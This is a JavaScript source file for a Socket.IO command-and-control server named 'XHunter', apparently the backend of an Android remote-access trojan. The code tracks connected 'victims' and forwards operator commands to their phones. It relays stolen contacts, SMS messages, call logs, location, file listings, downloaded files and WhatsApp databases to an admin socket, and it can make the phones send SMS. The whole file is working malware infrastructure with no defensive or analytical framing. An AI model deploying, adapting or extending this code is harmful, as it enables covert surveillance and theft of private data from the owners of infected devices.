
const { Server } = require("socket.io");
const { createServer } = require("http");

let io;

module.exports = (req, res) => {
  if (!io) {
    const server = createServer((req, res) => res.end("XHunter Vercel Server Running"));
    io = new Server(server, {
      maxHttpBufferSize: 1e8,
      cors: {
        origin: "*",
      },
    });

    let victimList = {};
    let deviceList = {};
    let victimData = {};
    let adminSocketId = null;

    io.on("connection", (socket) => {
      socket.on("adminJoin", () => {
        adminSocketId = socket.id;
        if (Object.keys(victimData).length > 0) {
          Object.keys(victimData).map((key) =>
            socket.emit("join", victimData[key])
          );
        }
      });

      socket.on("request", (d) => {
        let { to, action, data } = JSON.parse(d);
        io.to(victimList[to]).emit(action, data);
      });

      socket.on("join", (device) => {
        victimList[device.id] = socket.id;
        victimData[device.id] = { ...device, socketId: socket.id };
        deviceList[socket.id] = {
          id: device.id,
          model: device.model,
        };
        socket.broadcast.emit("join", { ...device, socketId: socket.id });
      });

      socket.on("getDir", (data) => response("getDir", data));
      socket.on("getInstalledApps", (data) => response("getInstalledApps", data));
      socket.on("getContacts", (data) => response("getContacts", data));
      socket.on("sendSMS", (data) => response("sendSMS", data));
      socket.on("getCallLog", (data) => response("getCallLog", data));
      socket.on("previewImage", (data) => response("previewImage", data));
      socket.on("error", (data) => response("error", data));
      socket.on("getSMS", (data) => response("getSMS", data));
      socket.on("getLocation", (data) => response("getLocation", data));
      socket.on("download", (d, callback) => responseBinary("download", d, callback));
      socket.on("downloadWhatsappDatabase", (d, callback) =>
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback)
      );

      socket.on("disconnect", () => {
        if (socket.id === adminSocketId) {
          adminSocketId = null;
        } else {
          response("disconnectClient", socket.id);
          Object.keys(victimList).map((key) => {
            if (victimList[key] === socket.id) {
              delete victimList[key];
              delete victimData[key];
            }
          });
        }
      });

      function response(action, data) {
        if (adminSocketId) {
          io.to(adminSocketId).emit(action, data);
        }
      }

      function responseBinary(action, data, callback) {
        if (adminSocketId) {
          callback("success");
          io.to(adminSocketId).emit(action, data);
        }
      }
    });

    server.listen(3000, () => console.log("Vercel Server Running"));
  }

  res.end("XHunter Vercel Socket Server Initialized");
};
